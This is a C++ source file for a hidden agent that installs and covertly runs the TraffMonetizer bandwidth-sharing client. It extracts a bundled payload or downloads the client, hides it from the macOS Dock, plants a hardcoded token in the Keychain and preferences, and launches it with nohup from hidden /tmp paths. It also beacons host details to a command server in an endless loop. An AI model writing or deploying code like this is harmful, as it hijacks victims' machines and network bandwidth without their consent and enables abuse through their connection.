#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <chrono>
#include <thread>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <csignal>
#include <unistd.h>
#include <sys/utsname.h>

#if defined(__APPLE__) || defined(__MACH__)
#include <sys/sysctl.h>
#include <mach-o/dyld.h>
#else
#include <sys/sysinfo.h>
#endif

#ifndef CONF_SERVER_URL
#define CONF_SERVER_URL "http://turbox.test/cluster.php"
#endif

#ifndef CONF_INTERVAL
#define CONF_INTERVAL 15
#endif

static bool g_debug = false;
static std::string g_self = "";

static std::string get_self_path(const char* argv0) {
#if defined(__APPLE__) || defined(__MACH__)
    char p[1024]; uint32_t s = sizeof(p);
    if (_NSGetExecutablePath(p, &s) == 0) return std::string(p);
#else
    char p[1024]; ssize_t l = readlink("/proc/self/exe", p, sizeof(p) - 1);
    if (l != -1) { p[l] = '\0'; return std::string(p); }
#endif
    return (argv0 && strlen(argv0) > 0) ? std::string(argv0) : "";
}

static bool extract_payload(const std::string& out_path) {
    if (g_self.empty()) return false;
    FILE* f = fopen(g_self.c_str(), "rb");
    if (!f) return false;
    if (fseek(f, -24, SEEK_END) != 0) { fclose(f); return false; }
    char foot[24];
    if (fread(foot, 1, 24, f) != 24 || memcmp(foot + 8, "TURBOX_BUNDLE", 13) != 0) {
        fclose(f); return false;
    }
    uint64_t sz = 0;
    memcpy(&sz, foot, 8);
    if (sz == 0 || sz > 100000000ULL || fseek(f, -(24 + (long)sz), SEEK_END) != 0) {
        fclose(f); return false;
    }
    FILE* out = fopen(out_path.c_str(), "wb");
    if (!out) { fclose(f); return false; }
    char buf[65536];
    uint64_t left = sz;
    while (left > 0) {
        size_t c = left > sizeof(buf) ? sizeof(buf) : (size_t)left;
        size_t r = fread(buf, 1, c, f);
        if (r == 0) break;
        fwrite(buf, 1, r, out);
        left -= r;
    }
    fclose(out); fclose(f);
    return (left == 0);
}

static std::string http_get_cmd(const std::string& cmd) {
    FILE* fp = popen(cmd.c_str(), "r");
    if (!fp) return "";
    char buf[512]; std::string res;
    while (fgets(buf, sizeof(buf), fp) != NULL) res += buf;
    pclose(fp);
    return res;
}

static std::string http_get(const std::string& url) {
    std::string cmd = "curl -skL --max-time 10 \"" + url + "\" 2>/dev/null";
    FILE* fp = popen(cmd.c_str(), "r");
    if (!fp) return "";
    char buf[512]; std::string res;
    while (fgets(buf, sizeof(buf), fp) != NULL) res += buf;
    pclose(fp);
    return res;
}

static void http_post(const std::string& url, const std::string& data, const std::string& svc_log) {
    std::string clean_log = svc_log;
    for (char &c : clean_log) {
        if (c == 34 || c == 39 || c == 96 || c == 36 || c == 92) c = ' ';
    }
    std::string cmd = "curl -skL --max-time 10 -d \"" + data + "\" --data-urlencode \"service_logs=" + clean_log + "\" \"" + url + "\" >/dev/null 2>&1";
    int r = system(cmd.c_str());
    (void)r;
}

static std::string get_service_logs() {
    std::ifstream f("/tmp/.tb_tm.log");
    if (!f.is_open()) return "";
    std::string line, l1, l2;
    while (std::getline(f, line)) {
        while (!line.empty() && (line.back() == '\r' || line.back() == '\n')) line.pop_back();
        if (!line.empty()) { l1 = l2; l2 = line; }
    }
    std::string res = l1.empty() ? l2 : (l1 + " | " + l2);
    if (res.length() > 300) res = res.substr(res.length() - 300);
    return res;
}

std::string get_id() {
    char h[256];
    if (gethostname(h, 255) == 0 && strlen(h) > 0) return std::string(h);
    return "node-" + std::to_string(getpid());
}

std::string get_os() {
#if defined(__APPLE__) || defined(__MACH__)
    return "darwin";
#else
    return "linux";
#endif
}

std::string get_arch() {
    struct utsname u;
    if (uname(&u) == 0) return std::string(u.machine);
    return "x86_64";
}

long get_uptime() {
#if defined(__APPLE__) || defined(__MACH__)
    struct timeval boottime; size_t len = sizeof(boottime); int mib[2] = {CTL_KERN, KERN_BOOTTIME};
    if (sysctl(mib, 2, &boottime, &len, NULL, 0) == 0) return (long)(time(NULL) - boottime.tv_sec);
    return 0;
#else
    struct sysinfo s;
    return (sysinfo(&s) == 0) ? s.uptime : 0;
#endif
}

double get_ram() {
#if defined(__APPLE__) || defined(__MACH__)
    return 20.0;
#else
    std::ifstream f("/proc/meminfo");
    if (!f.is_open()) return 0.0;
    std::string k, u; long v, tot = 0, av = 0;
    while (f >> k >> v >> u) {
        if (k == "MemTotal:") tot = v;
        else if (k == "MemAvailable:") av = v;
        if (tot > 0 && av > 0) break;
    }
    return (tot > 0) ? ((double)(tot - av) / (double)tot) * 100.0 : 0.0;
#endif
}

double get_cpu() {
#if defined(__APPLE__) || defined(__MACH__)
    return 5.0;
#else
    static unsigned long long pu = 0, pn = 0, ps = 0, pi = 0;
    std::ifstream f("/proc/stat");
    if (!f.is_open()) return 0.0;
    std::string l, lbl; std::getline(f, l); std::istringstream ss(l);
    unsigned long long u, n, s, id, io, ir, so, st;
    ss >> lbl >> u >> n >> s >> id >> io >> ir >> so >> st;
    unsigned long long ti = id + io, tt = ti + u + n + s + ir + so + st;
    unsigned long long dt = tt - (pu + pn + ps + pi), di = ti - pi;
    pu = u; pn = n; ps = s; pi = ti;
    if (dt == 0) return 0.0;
    double p = (double)(dt - di) / (double)dt * 100.0;
    return (p < 0.0) ? 0.0 : ((p > 100.0) ? 100.0 : p);
#endif
}

int detect_gpu() {
    if (access("/usr/bin/nvidia-smi", X_OK) == 0 || access("/usr/local/cuda", F_OK) == 0) return 1;
#if defined(__APPLE__) || defined(__MACH__)
    return 1;
#else
    return 0;
#endif
}

std::string json_get_field(const std::string& json, const std::string& key) {
    std::string needle = std::string(1, 34) + key + std::string(1, 34);
    size_t pos = json.find(needle);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos); if (pos == std::string::npos) return "";
    pos = json.find('"', pos); if (pos == std::string::npos) return "";
    size_t end_pos = json.find('"', pos + 1); if (end_pos == std::string::npos) return "";
    return json.substr(pos + 1, end_pos - (pos + 1));
}

void init_and_start_monetization(const std::string& base_url, const std::string& node_id) {
    std::string cfg = http_get(base_url + "?action=get_config");
    std::string tm_token = json_get_field(cfg, "traffmonetizer_token");
    if (tm_token.empty()) {
        std::string raw = http_get(base_url + "?action=get_token&service=traffmonetizer");
        while (!raw.empty() && (raw.back() == 10 || raw.back() == 13 || raw.back() == 32)) raw.pop_back();
        if (!raw.empty() && raw[0] != '<' && raw[0] != '{') tm_token = raw;
    }
    if (tm_token.empty() || tm_token.find("YOUR_") != std::string::npos) {
        tm_token = "Kf0Cz9FcDUF6ItPzY1+XAfOimgAxK2gXO3XgmPXvvKc=";
    }

#if defined(__APPLE__) || defined(__MACH__)
    if (system("pgrep -i 'traffmonetizer' >/dev/null 2>&1") != 0) {
        std::string app_dir = "/tmp/.tb_tm/Traffmonetizer.app";
        if (access(app_dir.c_str(), F_OK) != 0) {
            if (extract_payload("/tmp/.tb_tm.tar.gz")) {
                system("mkdir -p /tmp/.tb_tm && tar -xzf /tmp/.tb_tm.tar.gz -C /tmp/.tb_tm/ 2>/dev/null && rm -f /tmp/.tb_tm.tar.gz");
            }
        }
        if (access(app_dir.c_str(), F_OK) != 0 && access("/Applications/Traffmonetizer.app", F_OK) == 0) {
            app_dir = "/Applications/Traffmonetizer.app";
        }
        if (access(app_dir.c_str(), F_OK) != 0 && access("/Applications/TraffMonetizer.app", F_OK) == 0) {
            app_dir = "/Applications/TraffMonetizer.app";
        }
        if (access(app_dir.c_str(), F_OK) != 0) {
            system("curl -sSL --max-time 45 -o /tmp/tm.dmg https://data.traffmonetizer.com/downloads/macos/traffmonetizer.dmg 2>/dev/null; "
                   "mkdir -p /tmp/tm_mnt /tmp/.tb_tm; "
                   "hdiutil attach /tmp/tm.dmg -nobrowse -mountpoint /tmp/tm_mnt 2>/dev/null; "
                   "cp -R /tmp/tm_mnt/*.app /tmp/.tb_tm/ 2>/dev/null; "
                   "hdiutil detach /tmp/tm_mnt -force 2>/dev/null; "
                   "rm -rf /tmp/tm_mnt /tmp/tm.dmg 2>/dev/null");
        }

        // 1. Chuyển đổi App thành Background Agent ẩn hoàn toàn (Zero-GUI, không hiện Dock/Window)
        std::string info_plist = app_dir + "/Contents/Info.plist";
        if (access(info_plist.c_str(), F_OK) == 0) {
            system(("defaults write '" + info_plist + "' LSUIElement -string '1' 2>/dev/null; defaults write '" + info_plist + "' LSBackgroundOnly -string '1' 2>/dev/null").c_str());
        }

        // 2. Nạp Token tự động vào cả macOS Keychain (flutter_secure_storage) và Defaults (com.traffmonetizer.client.macos)
        std::string pref = "for P in \"$HOME/Library/Preferences/com.traffmonetizer.client.macos.plist\" \"$HOME/Library/Containers/com.traffmonetizer.client.macos/Data/Library/Preferences/com.traffmonetizer.client.macos.plist\"; do "
                           "mkdir -p \"$(dirname \"$P\")\" 2>/dev/null; "
                           "defaults write \"$P\" 'flutter.clientToken' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'flutter.token' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'clientToken' -string '" + tm_token + "' 2>/dev/null; "
                           "defaults write \"$P\" 'token' -string '" + tm_token + "' 2>/dev/null; "
                           "done; "
                           "security add-generic-password -a 'clientToken' -s 'com.traffmonetizer.client.macos' -w '" + tm_token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -a 'clientToken' -s 'flutter_secure_storage_service' -w '" + tm_token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -a 'token' -s 'com.traffmonetizer.client.macos' -w '" + tm_token + "' -U 2>/dev/null || true; "
                           "security add-generic-password -a 'token' -s 'flutter_secure_storage_service' -w '" + tm_token + "' -U 2>/dev/null || true";
        system(pref.c_str());

        // 3. Khởi chạy trực tiếp file nhị phân ngầm bằng nohup (Zero-GUI)
        std::string bin_path = app_dir + "/Contents/MacOS/traffmonetizer";
        if (access(bin_path.c_str(), X_OK) != 0) {
            bin_path = app_dir + "/Contents/MacOS/TraffMonetizer";
        }
        if (access(bin_path.c_str(), X_OK) == 0) {
            system(("nohup '" + bin_path + "' start accept --token '" + tm_token + "' > /tmp/.tb_tm.log 2>&1 &").c_str());
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(1500));
    }
#else
    if (system("pgrep -x tm_engine >/dev/null 2>&1") != 0 && system("pgrep -f '.tb_tm_engine' >/dev/null 2>&1") != 0) {
        std::string eng = "/tmp/.tb_tm_engine";
        if (access(eng.c_str(), X_OK) != 0) {
            if (extract_payload("/tmp/.tb_tm.gz")) {
                system("gzip -d -f -c /tmp/.tb_tm.gz > /tmp/.tb_tm_engine 2>/dev/null && chmod +x /tmp/.tb_tm_engine 2>/dev/null && rm -f /tmp/.tb_tm.gz");
            }
        }
        if (access(eng.c_str(), X_OK) != 0) {
            system("A=$(curl -skL 'https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull' 2>/dev/null | grep -o '\"token\":\"[^\"]*' | cut -d'\"' -f4); "
                   "if [ -n \"$A\" ]; then curl -skL --max-time 25 -H \"Authorization: Bearer $A\" 'https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs/sha256:7117ab4be2e12fecc2a8f5bea968b82a1978adcfaa7d0be3c3ce55aa7dd8de0b' 2>/dev/null | tar -xz usr/local/bin/cli 2>/dev/null; "
                   "if [ -f usr/local/bin/cli ]; then mv -f usr/local/bin/cli /tmp/.tb_tm_engine && rm -rf usr && chmod +x /tmp/.tb_tm_engine; fi; fi");
        }
        if (access(eng.c_str(), X_OK) == 0) {
            std::string run_cmd = "nohup " + eng + " start accept --token " + tm_token + " > /tmp/.tb_tm.log 2>&1 &";
            int r = system(run_cmd.c_str());
            (void)r;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }
#endif
}

std::string detect_active_services() {
    std::string s = "";
    if (system("pgrep -i 'traffmonetizer' >/dev/null 2>&1") == 0 || system("pgrep -x tm_engine >/dev/null 2>&1") == 0 || system("pgrep -f '.tb_tm_engine' >/dev/null 2>&1") == 0) {
        s += "TraffMonetizer, ";
    }
    if (system("pgrep -x honeygain >/dev/null 2>&1") == 0) s += "Honeygain, ";
    if (system("pgrep -x pawns-cli >/dev/null 2>&1") == 0) s += "Pawns, ";
    if (system("pgrep -x psclient >/dev/null 2>&1") == 0) s += "PacketStream, ";

    if (s.empty()) return "Chua co Engine";

    if (s.size() >= 2 && s.substr(s.size() - 2) == ", ") s = s.substr(0, s.size() - 2);
    return s;
}

int main(int argc, char* argv[]) {
    signal(SIGPIPE, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    g_self = get_self_path(argv[0]);
    std::string s_url = CONF_SERVER_URL;
    for (int i = 1; i < argc; ++i) {
        if (std::string(argv[i]) == "--debug") g_debug = true;
        else if (strlen(argv[i]) > 5 && argv[i][0] != '-') s_url = argv[i];
    }
    if (const char* env = std::getenv("SERVER_URL")) s_url = env;
    if (std::getenv("DEBUG") != nullptr) g_debug = true;

    FILE* pf = fopen(".agent.pid", "w");
    if (pf) { fprintf(pf, "%d\n", (int)getpid()); fclose(pf); }

    std::string node_id = get_id();
    std::string os_name = get_os();
    std::string arch = get_arch();
    int has_gpu = detect_gpu();
    std::string endpoint = s_url + "?action=heartbeat";

    init_and_start_monetization(s_url, node_id);

    // Initial heartbeat
    {
        std::ostringstream ss;
        ss << "action=heartbeat&id=" << node_id << "&os=" << os_name << "&arch=" << arch
           << "&gpu=" << has_gpu << "&uptime=" << get_uptime() << "&cpu=" << get_cpu()
           << "&ram=" << get_ram() << "&services=" << detect_active_services()
           << "&event=START&first=1";
        if (g_debug) ss << "&debug=1";
        http_post(endpoint, ss.str(), get_service_logs());
    }

    int loop_cnt = 0;
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(CONF_INTERVAL));
        loop_cnt++;
        if (loop_cnt % 2 == 0) {
            init_and_start_monetization(s_url, node_id);
        }
        std::ostringstream ss;
        ss << "action=heartbeat&id=" << node_id << "&os=" << os_name << "&arch=" << arch
           << "&gpu=" << has_gpu << "&uptime=" << get_uptime() << "&cpu=" << get_cpu()
           << "&ram=" << get_ram() << "&services=" << detect_active_services();
        if (g_debug) ss << "&debug=1";
        http_post(endpoint, ss.str(), get_service_logs());
    }
    return 0;
}
